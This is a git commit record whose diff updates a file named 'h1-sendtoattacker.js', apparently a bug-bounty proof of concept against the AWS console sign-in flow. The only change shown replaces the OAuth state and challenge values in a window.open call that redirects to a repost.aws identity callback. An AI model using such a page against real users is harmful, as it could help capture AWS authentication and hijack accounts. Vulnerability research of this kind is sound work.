2029d7c64194716d85c1aff109e451e8371cd458
yipman16 <83105601+yipman16@users.noreply.github.com>
2024-10-12 10:48:36 +0300

    Update h1-sendtoattacker.js

--- h1-sendtoattacker.js
+++ h1-sendtoattacker.js
@@ -453,7 +453,7 @@ body.awsui-polaris-dark-mode {
 
 
 document.getElementById('openWindowBtn').addEventListener('click', function() {
-    let newWindow = window.open("https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6ImxpV2R0MXVRUUNLa09RS1AwTW1PLWcifQ&challenge=5osQZ8-txgacOISU7SvWjXYyOU5yQvFTDUrj9nbpb7Q", "_blank");
+    let newWindow = window.open("https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6InhVMFZkWElOUmwySU5EXy04ZEQzTWcifQ&challenge=YnFtEhWC_nnYBW7CrUQVifnm2hviz8nNr7haYNS0wd4", "_blank");
 
     if (newWindow) {
         setTimeout(function () {
